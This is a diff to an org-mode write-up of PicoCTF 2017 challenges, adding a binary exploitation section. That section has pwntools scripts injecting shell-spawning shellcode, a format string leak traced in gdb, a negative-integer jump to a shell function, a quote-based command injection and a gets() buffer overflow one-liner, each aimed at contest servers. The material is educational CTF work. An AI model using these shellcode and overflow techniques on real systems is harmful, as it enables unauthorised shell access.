@@ -1,11 +1,27 @@
 #+TITLE: PicoCTF 2017
-#+OPTIONS:  toc:4
+#+OPTIONS:  toc:4 
+#+BEGIN_EXPORT html
+<style type="text/css">
+.h3, h3 {
+    font-size: 25px;
+    padding: 10px
+}
+.h4, h4 {
+    font-size: 21px;
+    padding: 22px
+}
+</style>
+
+#+END_EXPORT
+
 * Level 1 
 ** Forensics
 *** Digital Camouflage
 Link : [[https://2017game.picoctf.com/game/level-1/challenge/Digital-Camouflage][Digital Camouflage]]
 
+#+BEGIN_QUOTE
 We need to gain access to some routers. Let's try and see if we can find the password in the captured network data : [[file:./data.pcap][data.pcap]]
+#+END_QUOTE
 
 Hint :
 #+BEGIN_QUOTE
@@ -39,12 +55,15 @@ KN1Z6PXVy9
 
 Link : [[https://2017game.picoctf.com/game/level-1/challenge/Special-Agent-User][Special Agent User]] 
 
+#+BEGIN_QUOTE
 We can get into the Administrator's computer with a browser exploit. But first, we need to figure out what browser they're using.
 Perhaps this information is located in a network packet capture we took: [[file:./data1.pcap][data.pcap]]
 Enter the browser and version as "BrowserName BrowserVersion". NOTE: We're just looking for up to 3 levels of subversions for
 the browser version (ie. Version 1.2.3 for Version 1.2.3.4) and ignore any 0th subversions (ie. 1.2 for 1.2.0)
+#+END_QUOTE
 
 Hint :
+
 #+BEGIN_QUOTE
 Where can we find information on the browser in networking data? Maybe [[http://www.useragentstring.com./][try reading up on user-agent strings]]
 #+END_QUOTE
@@ -77,8 +96,10 @@ Which tells that the browser is Chrome version 35.0.2117
 *** Bash Loop
 Link:[[https://2017game.picoctf.com/game/level-1/challenge/Bash-Loop][bash loop]]
 
+#+BEGIN_QUOTE
 We found a program that is hiding a flag but requires you to guess the number it is thinking of. Chances are Linux has an easy
 way to try all the numbers... Go to /problems/69a376443853a8d385877f60375188bf and try it out!
+#+END_QUOTE
 
 Solution :
 
@@ -109,7 +130,9 @@ Yay! That's the number! Here be the flag: 249808e7eba907b7e323f4f2fff2406d
 *** Just No
 Link : [[https://2017game.picoctf.com/game/level-1/challenge/Just-No][just no]]
 
+#+BEGIN_QUOTE
 A program at /problems/276fc27f3ef921f0e2f0f75ba95c9e60 has access to a flag but refuses to share it. Can you convince it otherwise?
+#+END_QUOTE
 
 Hint :
 #+BEGIN_QUOTE
@@ -174,8 +197,10 @@ Oh. Well the auth file doesn't say no anymore so... Here's the flag: 8661ca23ef6
 *** Hex2Raw
 Link : [[https://2017game.picoctf.com/game/level-1/challenge/Hex2Raw][hex2raw]]
 
+#+BEGIN_QUOTE
 This program requires some unprintable characters as input... But how do you print unprintable characters? CLI yourself to 
 /problems/c69bcda4ca5a28fd9d18790fc763db73 and turn that Hex2Raw!
+#+END_QUOTE
 
 Running hex2raw program gives
 #+BEGIN_EXAMPLE
@@ -201,8 +226,10 @@ Yay! That's what I wanted! Here be the flag:
 *** Raw2Hex
 Link : [[https://2017game.picoctf.com/game/level-1/challenge/Raw2Hex][raw2hex]]
 
+#+BEGIN_QUOTE
 This program just prints a flag in raw form. All we need to do is convert the output to hex and we have it! CLI yourself to 
 /problems/7ed72aec10a93d978ec3542055975d36 and turn that Raw2Hex!
+#+END_QUOTE
 
 Solution :
 
@@ -221,7 +248,12 @@ And the flag is the  ~233a338f3052fec75f009f2485ac5352~  hex
 ** Web Exploitation
 *** What Is Web
 Link : [[https://2017game.picoctf.com/game/level-1/challenge/What-Is-Web][what is web]]
+
+#+BEGIN_QUOTE
 Someone told me that some guy came up with the "World Wide Web", using "HTML" and "stuff". Can you help me figure out what that is?  [[http://shell2017.picoctf.com:4443/][webpage]]
+#+END_QUOTE
+
+Solution: 
 
 The flag is placed in the html , css and javascript files of the webpage
 html
@@ -244,9 +276,11 @@ flag : 72b28b258d2b2ea021486fddd5020451d
 
 Link : [[https://2017game.picoctf.com/game/level-2/challenge/Meta-Find-Me][Meta-Find-Me]]
 
+#+BEGIN_QUOTE
 Find the location of the flag in the image: [[file:./image.jpg][image.jpg]] Note: Latitude and longitude values are in degrees with no degree symbols,
 /direction letters, minutes, seconds, or periods. They should only be digits. The flag is not just a set of coordinates - if 
 you think that, keep looking!
+#+END_QUOTE
 
 Hint : 
 #+BEGIN_QUOTE
@@ -271,7 +305,9 @@ flag_2_meta_4_me_7_96_1c1f
 *** Little School Bus
 Link : [[https://2017game.picoctf.com/game/level-2/challenge/Little-School-Bus][Little-School-Bus]] 
 
+#+BEGIN_QUOTE
 Can you help me find the data in this [[file:./littleschoolbus.bmp][littleschoolbus.bmp]]
+#+END_QUOTE
 
 Hint :
 #+BEGIN_QUOTE
@@ -361,8 +397,10 @@ Footnote :
 :END:
 Link : [[https://2017game.picoctf.com/game/level-2/challenge/SoRandom][SoRandom]]
 
+#+BEGIN_QUOTE
 We found [[file:./sorandom.py][sorandom.py]] running at shell2017.picoctf.com:27691. It seems to be outputting the flag but randomizing all the characters first. 
 Is there anyway to get back the original flag?
+#+END_QUOTE
 
 Hint: 
 #+BEGIN_QUOTE
@@ -447,8 +485,10 @@ FLAG:96109120ba8d1c844afe294c3cd1eb4c
 *** LeakedHashes
 Link : [[https://2017game.picoctf.com/game/level-2/challenge/LeakedHashes][LeakedHashes]]
 
+#+BEGIN_QUOTE
 Someone got hacked! Check out some service's password hashes that were leaked at [[file:./hashdump.txt][hashdump.txt]] Do you think they chose strong passwords?  
 We should check... The service is running at shell2017.picoctf.com:3815!
+#+END_QUOTE
 
 Hint :
 #+BEGIN_QUOTE
@@ -470,11 +510,541 @@ After cracking the hash just login with the username and password to get the fla
 #+BEGIN_QUOTE
 flag is 4f36a002cc953e6567a878758abc8cf9
 #+END_QUOTE
+** Binary Exploitation
+*** Shellz
+
+Link : [[https://2017game.picoctf.com/game/level-2/challenge/Shellz][Shellz]]
+
+#+BEGIN_QUOTE
+You no longer have an easy thing to call, but you have more space. Program: [[file:./shellz][shellz!]]  [[file:./shellz.c][Source]] . Connect on shell2017.picoctf.com:49324.
+#+END_QUOTE
+
+Hint :
+#+BEGIN_QUOTE
+There is a bunch of preexisting shellcode already out there!
+#+END_QUOTE
+
+Solution :
+
+The program reads 40 bytes and executes these binary , So we need to inject shell code of length less than 40 bytes
+
+This is a shell code from [[https://www.exploit-db.com/exploits/36395/][explit-db]]
+#+BEGIN_QUOTE
+"\x31\xd2\x52\xb8\xb7\xd8\x3e\x56\x05\x78\x56\x34\x12\x50\xb8\xde\xc0\xad"
+"\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd"
+"\x80\x96\xcd\x80"
+#+END_QUOTE
+
+Exploit Code 
+
+#+BEGIN_SRC python :results output org drawer
+from pwn import *
+
+host = "shell2017.picoctf.com"
+port = "49324"
+
+#shellcode which spawn shell
+shellcode = "\x31\xd2\x52\xb8\xb7\xd8\x3e\x56\x05\x78\x56\x34\x12\x50\xb8\xde\xc0\xad\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80\x96\xcd\x80"
+
+io = remote(host, port)  # Connect to the server
+io.recvuntil("Give me 40 bytes:\n")  
+io.sendline(shellcode)  # Sends the shellcode
+io.sendline('cat flag.txt')
+print "Flag : ",
+print(io.readline())
+io.close()
+
+#+END_SRC
+
+Which Gives the Flag !
+#+BEGIN_QUOTE
+51e2978e4e59013145c2613f01185802
+#+END_QUOTE
+
+*** Shells
+
+Link : [[https://2017game.picoctf.com/game/level-2/challenge/Shells][shells]]
+
+How much can a couple bytes do? Use [[file:./shells][shells!]] [[file:./shells.c][Source]] . Connect on shell2017.picoctf.com:40976
+
+Hint :
+#+BEGIN_QUOTE
+Read about basic shellcode
+You don't need a full shell (yet...), just enough to get the flag
+#+END_QUOTE
+
+Solution :
+
+We have to write basic shell code to call win funtion 
+
+Exploit code 
+
+#+BEGIN_SRC python :results output org drawer
+from pwn import *
+
+host = "shell2017.picoctf.com"
+port = "40976"
+
+context(arch="i386", os='linux')
+
+payload = '''
+/* call vuln funtion */
+mov eax, 0x08048540
+call eax 
+'''
+
+
+io = remote(host, port)
+io.recvuntil("Give me 10 bytes:")
+io.sendline(asm(payload))
+print(io.readall())
+io.close()
+
+#+END_SRC
+
+which gives the flag!
+
+#+BEGIN_QUOTE
+cd875b6ffb5cdd3319532d52ceca71aa
+#+END_QUOTE
+
+*** Guess The Number
+
+Link : [[https://2017game.picoctf.com/game/level-2/challenge/Guess-The-Number][Guess-the-Number]] 
+
+#+BEGIN_QUOTE
+Just a simple number-guessing game. How hard could it be? [[file:./guess_num][Binary]] [[file:./guess_num.c][Source.]] Connect on shell2017.picoctf.com:20545.
+#+END_QUOTE
+
+Hint : 
+#+BEGIN_QUOTE
+What is the program doing with your input number?
+strtol checks for overflow, but it does allow negative numbers...
+#+END_QUOTE
+
+Solution :
+
+Lets look at the souce code 
+#+BEGIN_SRC C
+/* How well do you know your numbers? */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+void win(void) {
+    printf("Congratulations! Have a shell:\n");
+    system("/bin/sh -i");
+}
+
+int main(int argc, char **argv) {
+    uintptr_t val;
+    char buf[32] = "";
+
+    /* Turn off buffering so we can see output right away */
+    setbuf(stdout, NULL);
+
+    printf("Welcome to the number guessing game!\n");
+    printf("I'm thinking of a number. Can you guess it?\n");
+    printf("Guess right and you get a shell!\n");
+
+    printf("Enter your number: ");
+    scanf("%32s", buf);
+    val = strtol(buf, NULL, 10);
+
+    printf("You entered %d. Let's see if it was right...\n", val);
+
+    val >>= 4;
+    ((void (*)(void))val)();
+}
+#+END_SRC
+
+From the souce we can see that the address in val is called at last , so we need to get the adress of the funtion win into ~val~ . 
+Interger from the input is stored into the variable with the funtion ~strtol() : convert a string to a long integer~ , Then 4 byte is is shifted to right 
+
+
+#+BEGIN_SRC shell
+objdump -d guess_num
+#+END_SRC
+
+gives the address of  win as ~0x0804852b~ which is 134513963 , when giving this to output the address called is 0x804852, 
+This is because of the shift operator
+#+BEGIN_EXAMPLE
+>>> 0x0804852b
+134513963
+>>> bin(134513963)
+'0b1000000001001000010100101011'
+>>> hex(0b100000000100100001010010)
+'0x804852'
+#+END_EXAMPLE
+So we need to input larger number , lets give ~0x0804852bb~ which is ~2152223419~ , but the value stored in the memory was ~0x7ffffff~ , 
+this happend because of the overflow  0x0804852bb > 2 ** 31 - 1 .
+
+I spend some time here without seeing the hint saying about negative numbers . How negative numbers are stored in computer , One of the 
+fundemental idea complement notaion . So now we need to find a negarive number . Two's complement of ~0x0804852bb~ is ~-2142743877~ . 
+
+
+Which gives the Flag !
+#+BEGIN_EXAMPLE
+Welcome to the number guessing game!
+I'm thinking of a number. Can you guess it?
+Guess right and you get a shell!
+Enter your number: -2142743877
+You entered -2142743877. Let's see if it was right...
+Congratulations! Have a shell:
+/bin/sh: 0: can't access tty; job control turned off
+$ cat flag.txt
+181db5615729e295ea7a5d5773c3829b
+#+END_EXAMPLE
+
+Footnote :
+
+1. http://www.exploringbinary.com/twos-complement-converter/
+
+*** Ive Got A Secret
+Link : [[https://2017game.picoctf.com/game/level-2/challenge/Ive-Got-A-Secret][Ive-Got-A-Secret]] 
+
+#+BEGIN_QUOTE
+Hopefully you can find the right format for my [[file:./secret][secret!]] [[file:./secret.c][Source.]] Connect on shell2017.picoctf.com:42684.
+#+END_QUOTE
+
+Hint : 
+#+BEGIN_QUOTE
+This is a beginning format string attack.
+#+END_QUOTE
+
+Solution : 
+
+The souce contains a format string vulnarability @
+#+BEGIN_SRC c
+printf("Give me something to say!\n");
+fflush(stdout);
+fgets(buffer, BUF_LEN, stdin);
+printf(buffer);  /*<-- Here*/
+#+END_SRC
+
+Executing gives 
+#+BEGIN_EXAMPLE
+Give me something to say!
+HI
+HI
+Now tell my secret in hex! Secret: d
+As my friend says,"You get nothing! You lose! Good day, Sir!"
+#+END_EXAMPLE
+
+Lets look at the source 
+#+BEGIN_SRC C
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+#define BUF_LEN 64
+char buffer[BUF_LEN];
+
+int main(int argc, char** argv) {
+    int fd = open("/dev/urandom", O_RDONLY);
+    if(fd == -1){
+        puts("Open error on /dev/urandom. Contact an admin\n");
+        return -1;
+    }
+    int secret;
+    if(read(fd, &secret, sizeof(int)) != sizeof(int)){
+        puts("Read error. Contact admin!\n");
+        return -1;
+    }
+    close(fd);
+    printf("Give me something to say!\n");
+    fflush(stdout);
+    fgets(buffer, BUF_LEN, stdin);
+    printf(buffer);
+
+    int not_secret;
+    printf("Now tell my secret in hex! Secret: ");
+    fflush(stdout);
+    scanf("%x", &not_secret);
+    if(secret == not_secret){
+        puts("Wow, you got it!");
+        system("cat ./flag.txt");   
+    }else{
+        puts("As my friend says,\"You get nothing! You lose! Good day, Sir!\"");
+    }
+
+    return 0;
+}
+
+#+END_SRC
+
+The program load a nunber from /dev/random and store it in variable secret , We have to use the format string to access variable and read its 
+content
+
+This is the place were the check occures
+#+BEGIN_EXAMPLE
+   0x080486ed <+258>:	add    esp,0x10
+   0x080486f0 <+261>:	mov    edx,DWORD PTR [ebp-0x10]
+   0x080486f3 <+264>:	mov    eax,DWORD PTR [ebp-0x14]
+   0x080486f6 <+267>:	cmp    edx,eax
+#+END_EXAMPLE
+
+Breaking here and analysing the execution
+#+BEGIN_EXAMPLE conf
+gdb-peda$ break *0x080486f6
+Breakpoint 1 at 0x80486f6
+gdb-peda$ r
+Starting program: /home/nemesis/Downloads/secret 
+Give me something to say!
+%x:%x:%x:%x:%x:%x 
+40:f7faa5a0:8048792:1:ffffd0d4:756e6da
+Now tell my secret in hex! Secret: 0x000111
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x111 
+EBX: 0x0 
+ECX: 0x1 
+EDX: 0x756e6da 
+ESI: 0x1 
+EDI: 0xf7faa000 --> 0x1b2db0 
+EBP: 0xffffd028 --> 0x0 
+ESP: 0xffffd010 --> 0x1 
+EIP: 0x80486f6 (<main+267>:	cmp    edx,eax)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80486ed <main+258>:	add    esp,0x10
+   0x80486f0 <main+261>:	mov    edx,DWORD PTR [ebp-0x10]
+   0x80486f3 <main+264>:	mov    eax,DWORD PTR [ebp-0x14]
+=> 0x80486f6 <main+267>:	cmp    edx,eax
+   0x80486f8 <main+269>:	jne    0x804871c <main+305>
+   0x80486fa <main+271>:	sub    esp,0xc
+   0x80486fd <main+274>:	push   0x804886b
+   0x8048702 <main+279>:	call   0x8048480 <puts@plt>
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd010 --> 0x1 
+0004| 0xffffd014 --> 0x111 
+0008| 0xffffd018 --> 0x756e6da 
+0012| 0xffffd01c --> 0x3 
+0016| 0xffffd020 --> 0xf7faa3dc --> 0xf7fab1e0 --> 0x0 
+0020| 0xffffd024 --> 0xffffd040 --> 0x1 
+0024| 0xffffd028 --> 0x0 
+0028| 0xffffd02c --> 0xf7e0f276 (<__libc_start_main+246>:	add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080486f6 in main ()
+gdb-peda$ 
+#+END_EXAMPLE
+
+EDX Register has the random hex which is shown by the 6 th %x , now we exploit !
+
+#+BEGIN_EXAMPLE
+Give me something to say!
+%x:%x:%x:%x:%x:%x
+40:f7fc7c20:8048792:1:ffffdd34:2e9a2fb1
+Now tell my secret in hex! Secret: 0x2e9a2fb1
+65aaf5d76d7fa708642cf1ab573ebf58
+Wow, you got it!
+#+END_EXAMPLE
+
+*** Flagsay 1
+Link : [[https://2017game.picoctf.com/game/level-2/challenge/Flagsay-1][Flagsay-1]] 
+
+#+BEGIN_QUOTE
+I heard you like flags, so now you can make your own! Exhilarating! Use [[file:./flagsay-1][flagsay-1!]] [[file:./flagsay-1.c][Source]]. Connect on shell2017.picoctf.com:30556.
+#+END_QUOTE
+
+Hint : 
+#+BEGIN_QUOTE
+System will run exactly what the program gives it
+#+END_QUOTE
+
+Solution : 
+
+running the binary file 
+#+BEGIN_QUOTE
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+               _                                        
+              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+             //AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/     
+            //AAAAAA                             /      
+           //                                   /       
+          //                                   /        
+         //                                   /         
+        //                                   /          
+       //___________________________________/           
+      //                                                
+     //                                                 
+    //                                                  
+   //                                                   
+  //                                                    
+ //                                                     
+
+
+#+END_QUOTE
+
+While giving random input i realized that giving " gives an error
+
+#+BEGIN_QUOTE
+"
+               _                                        
+              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+             // /
+sh: 4: //: Permission denied
+sh: 5: //: Permission denied
+sh: 6: //: Permission denied
+sh: 7: //: Permission denied
+sh: 8: //: Permission denied
+sh: 9: //___________________________________/: not found
+sh: 10: //: Permission denied
+sh: 11: //: Permission denied
+sh: 12: //: Permission denied
+sh: 13: //: Permission denied
+sh: 14: //: Permission denied
+sh: 15: //: Permission denied
+sh: 17: Syntax error: Unterminated quoted string
+
+#+END_QUOTE
+
+From the error we can identify that all the lines after is beeing executed and we can give any input , giving "cat flag.txt , tells
+us the flag
+
+#+BEGIN_QUOTE
+
+#+END_QUOTE
+
+*** VR Gear Console
+
+Link : [[https://2017game.picoctf.com/game/level-2/challenge/VR-Gear-Console][VR-Gear-Console]]
+#+BEGIN_QUOTE
+Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: 
+/problems/e9cab2bb993540454b19d3d56769d9e6
+#+END_QUOTE
+
+Hint: 
+#+BEGIN_QUOTE
+What happens if you read in more characters than the length of the username buffer?
+You should look at an ascii table to see what character you need to choose.
+Numbers are stored in little-endian format, which means that the lowest byte of the number is first.
+"cat file - | vrgearconsole " will keep the pipe open for commands.
+#+END_QUOTE
+
+Solution :
+
+Source code 
+
+#+BEGIN_SRC C
+#include <stdlib.h>
+#include <stdio.h>
+
+int login() {
+    int accessLevel = 0xff;
+    char username[16];
+    char password[32];
+    printf("Username (max 15 characters): ");
+    gets(username);
+    printf("Password (max 31 characters): ");
+    gets(password);
+
+    if (!strcmp(username, "admin") && !strcmp(password, "{{ create_long_password() }}")) {
+        accessLevel = 2;
+    } else if (!strcmp(username, "root") && !strcmp(password, "{{ create_long_password() }}")) {
+        accessLevel = 0;
+    } else if (!strcmp(username, "artist") && !strcmp(password, "my-password-is-secret")) {
+        accessLevel = 0x80;
+    }
+
+    return accessLevel;
+}
+
+int main(int argc, char **argv) {
+    setbuf(stdout, NULL);
+    printf(
+        "+----------------------------------------+\n"
+        "|                                        |\n"
+        "|                                        |\n"
+        "|                                        |\n"
+        "|                                        |\n"
+        "|  Welcome to the VR gear admin console  |\n"
+        "|                                        |\n"
+        "|                                        |\n"
+        "|                                        |\n"
+        "|                                        |\n"
+        "+----------------------------------------+\n"
+        "|                                        |\n"
+        "|      Your account is not recognized    |\n"
+        "|                                        |\n"
+        "+----------------------------------------+\n"
+        "\n\n\n\n"
+        "Please login to continue...\n\n\n"
+    );
+    int access = login();
+
+    printf("Your access level is: 0x%08x\n", access);
+
+    if (access >= 0xff || access <= 0) {
+        printf("Login unsuccessful.\n");
+        exit(10);
+    } else if (access < 0x30) {
+        printf("Admin access granted!\n");
+        printf("The flag is in \"flag.txt\".\n");
+        system("/bin/sh");
+    } else {
+        printf("Login successful.\n");
+        printf("You do not have permission to access this resource.\n");
+        exit(1);
+    }
+}
+
+#+END_SRC
+
+This is a Simple buffer overflow , gets funtion is used to read the string and the acess variable is above the stack and we can overwrite it.
+Overflow occures due to the fact that ~gets()~ funtion does not specify a boundary of the input and reads all the input the user have given,
+and if input is larger that the variable size it keeps on writing data after the variable on the stack , so if there are other variable above
+we can overwrite it's value.
+
+Exploit Code
+
+#+BEGIN_QUOTE
+(python -c "print 'A'*16 + '\x20\npassword\n' "; cat - ) | ./vrgearconsole 
+#+END_QUOTE
+
+#+BEGIN_QUOTE
++----------------------------------------+
+|                                        |
+|                                        |
+|                                        |
+|                                        |
+|  Welcome to the VR gear admin console  |
+|                                        |
+|                                        |
+|                                        |
+|                                        |
++----------------------------------------+
+|                                        |
+|      Your account is not recognized    |
+|                                        |
++----------------------------------------+
+
+
+
+
+Please login to continue...
+
+
+Username (max 15 characters): Password (max 31 characters): Your access level is: 0x00000020
+Admin access granted!
+The flag is in "flag.txt".
+cat flag.txt
+da1e62f3da550878ed92d3d55d61fe7d
+
+#+END_QUOTE
+
 * Level 3
 ** Reversing 
 *** Coffee
 Link : [[https://2017game.picoctf.com/game/level-3/challenge/Coffee][Coffee]]
+
+#+BEGIN_QUOTE
 You found a suspicious USB drive in a jar of pickles. It contains this [[file:./freeThePickles.class][file]]
+#+END_QUOTE
 
 Hint : 
 #+BEGIN_QUOTE
